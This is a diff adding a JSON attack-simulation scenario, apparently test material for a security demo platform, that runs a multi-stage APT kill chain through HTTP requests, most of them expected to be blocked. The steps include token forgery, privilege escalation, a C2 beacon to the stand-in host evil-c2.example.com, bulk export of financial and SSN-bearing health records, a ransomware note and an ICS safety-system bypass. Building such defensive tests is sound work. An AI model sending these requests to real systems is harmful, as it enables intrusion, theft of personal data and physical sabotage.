@@ -1,0 +1,358 @@
+{
+  "id": "api-demo-apt-campaign",
+  "name": "Advanced Persistent Threat Multi-Stage Campaign",
+  "category": "Advanced Campaigns",
+  "difficulty": "Expert",
+  "description": "Sophisticated APT campaign demonstrating full MITRE ATT&CK kill chain with lateral movement, persistence, and multi-domain impact",
+  "steps": [
+    {
+      "id": "initial-recon",
+      "name": "External Infrastructure Reconnaissance",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/api/v1/auth/methods",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1)",
+          "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8"
+        }
+      },
+      "execution": {
+        "delayMs": 5000
+      }
+    },
+    {
+      "id": "vendor-supply-chain",
+      "name": "Supply Chain Vendor Discovery",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/api/vendors/marketplace",
+        "headers": {
+          "X-Scanner-Id": "recon-bot-v2"
+        }
+      },
+      "execution": {
+        "delayMs": 3000
+      },
+      "dependsOn": [
+        "initial-recon"
+      ]
+    },
+    {
+      "id": "oauth-token-forge",
+      "name": "OAuth Token Forgery",
+      "stage": "initial-access",
+      "request": {
+        "method": "POST",
+        "url": "/api/oauth/token/forge",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "client_id": "internal-app",
+          "username": "service-account"
+        }
+      },
+      "execution": {
+        "delayMs": 2000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "vendor-supply-chain"
+      ]
+    },
+    {
+      "id": "api-key-generation",
+      "name": "Rogue API Key Generation",
+      "stage": "persistence",
+      "request": {
+        "method": "POST",
+        "url": "/api/v1/auth/apikeys/create",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer {{forged_token}}"
+        },
+        "body": {
+          "name": "backup-service",
+          "expires_in_days": 9999
+        }
+      },
+      "execution": {
+        "delayMs": 1500
+      },
+      "dependsOn": [
+        "oauth-token-forge"
+      ]
+    },
+    {
+      "id": "device-registration",
+      "name": "Rogue Device Registration",
+      "stage": "persistence",
+      "request": {
+        "method": "POST",
+        "url": "/api/v1/device/register",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer {{forged_token}}"
+        },
+        "body": {
+          "device_name": "CORP-LAPTOP-0",
+          "device_type": "trusted"
+        }
+      },
+      "execution": {
+        "delayMs": 2500
+      },
+      "dependsOn": [
+        "api-key-generation"
+      ]
+    },
+    {
+      "id": "privilege-escalation",
+      "name": "Admin Privilege Escalation",
+      "stage": "privilege-escalation",
+      "request": {
+        "method": "PUT",
+        "url": "/api/vendors/privileges/escalate",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Internal-Request": "true"
+        },
+        "body": {
+          "vendor_id": "COMPROMISED-VENDOR",
+          "privilege": "platform_admin"
+        }
+      },
+      "execution": {
+        "delayMs": 1000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "device-registration"
+      ]
+    },
+    {
+      "id": "lateral-banking",
+      "name": "Lateral Movement to Banking",
+      "stage": "lateral-movement",
+      "request": {
+        "method": "GET",
+        "url": "/api/v1/banking/accounts/enumerate",
+        "headers": {
+          "Authorization": "Bearer {{escalated_token}}",
+          "X-Origin-System": "vendor-portal"
+        }
+      },
+      "execution": {
+        "delayMs": 2000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "privilege-escalation"
+      ]
+    },
+    {
+      "id": "lateral-healthcare",
+      "name": "Lateral Movement to Healthcare",
+      "stage": "lateral-movement",
+      "request": {
+        "method": "GET",
+        "url": "/api/medical/phi/endpoints",
+        "headers": {
+          "Authorization": "Bearer {{escalated_token}}",
+          "X-Origin-System": "finance-portal"
+        }
+      },
+      "execution": {
+        "delayMs": 1800
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "lateral-banking"
+      ]
+    },
+    {
+      "id": "lateral-ics",
+      "name": "Lateral Movement to ICS Network",
+      "stage": "lateral-movement",
+      "request": {
+        "method": "GET",
+        "url": "/api/ics/scada/systems",
+        "headers": {
+          "Authorization": "Bearer {{escalated_token}}",
+          "X-Origin-System": "healthcare-portal"
+        }
+      },
+      "execution": {
+        "delayMs": 2200
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "lateral-healthcare"
+      ]
+    },
+    {
+      "id": "data-staging",
+      "name": "Data Collection & Staging",
+      "stage": "collection",
+      "request": {
+        "method": "POST",
+        "url": "/api/vendors/documents/upload",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer {{escalated_token}}"
+        },
+        "body": {
+          "vendor_id": "STAGING-VENDOR",
+          "documents": [
+            {
+              "name": "collected_data.zip",
+              "size": 524288000
+            }
+          ]
+        }
+      },
+      "execution": {
+        "delayMs": 5000
+      },
+      "dependsOn": [
+        "lateral-ics"
+      ]
+    },
+    {
+      "id": "c2-channel",
+      "name": "Establish C2 Channel",
+      "stage": "command-control",
+      "request": {
+        "method": "POST",
+        "url": "/api/payments/gateway/status",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Callback-URL": "https://evil-c2.example.com/beacon"
+        },
+        "body": {
+          "status": "health_check",
+          "encoded_data": "base64_encoded_c2_traffic"
+        }
+      },
+      "execution": {
+        "delayMs": 3000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "data-staging"
+      ]
+    },
+    {
+      "id": "exfil-financial",
+      "name": "Financial Data Exfiltration",
+      "stage": "exfiltration",
+      "request": {
+        "method": "GET",
+        "url": "/api/v1/banking/statements?start_date=2020-01-01&format=csv&size=unlimited",
+        "headers": {
+          "Authorization": "Bearer {{escalated_token}}",
+          "Accept-Encoding": "gzip, deflate, br"
+        }
+      },
+      "execution": {
+        "delayMs": 4000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "c2-channel"
+      ]
+    },
+    {
+      "id": "exfil-health",
+      "name": "Healthcare Records Exfiltration",
+      "stage": "exfiltration",
+      "request": {
+        "method": "GET",
+        "url": "/api/hipaa/export/bulk?include_ssn=true&include_diagnosis=true",
+        "headers": {
+          "Authorization": "Bearer {{escalated_token}}",
+          "X-Compress": "true"
+        }
+      },
+      "execution": {
+        "delayMs": 4500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "exfil-financial"
+      ]
+    },
+    {
+      "id": "ransomware-deploy",
+      "name": "Ransomware Deployment Simulation",
+      "stage": "impact",
+      "request": {
+        "method": "POST",
+        "url": "/api/vendors/backdoor",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer {{escalated_token}}"
+        },
+        "body": {
+          "vendor_id": "ALL",
+          "action": "encrypt_data",
+          "ransom_note": "Your systems have been encrypted. Contact us for decryption."
+        }
+      },
+      "execution": {
+        "delayMs": 2000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "exfil-health"
+      ]
+    },
+    {
+      "id": "ics-sabotage",
+      "name": "ICS System Sabotage",
+      "stage": "impact",
+      "request": {
+        "method": "POST",
+        "url": "/api/ot/safety/bypass",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer {{escalated_token}}"
+        },
+        "body": {
+          "safety_system": "ALL",
+          "bypass": true,
+          "shutdown_delay": 0
+        }
+      },
+      "execution": {
+        "delayMs": 1500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "ransomware-deploy"
+      ]
+    }
+  ]
+}
